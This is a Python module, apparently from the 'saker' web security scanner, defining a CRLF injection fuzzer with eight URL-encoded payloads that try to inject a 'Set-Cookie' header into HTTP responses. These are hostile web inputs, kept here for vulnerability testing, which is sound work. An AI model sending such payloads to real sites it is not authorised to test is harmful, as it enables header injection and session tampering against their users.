#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class CRLFInjection(Fuzzer):

    """CRLFInjection"""
    payloads = [
        r'%%0a0aSet-Cookie:crlf=injection',
        r'%0aSet-Cookie:crlf=injection',
        r'%0d%0aSet-Cookie:crlf=injection',
        r'%0dSet-Cookie:crlf=injection',
        r'%23%0d%0aSet-Cookie:crlf=injection',
        r'%25%30%61Set-Cookie:crlf=injection',
        r'%2e%2e%2f%0d%0aSet-Cookie:crlf=injection',
        r'%2f%2e%2e%0d%0aSet-Cookie:crlf=injection',
    ]

    def __init__(self):
        super(CRLFInjection, self).__init__()
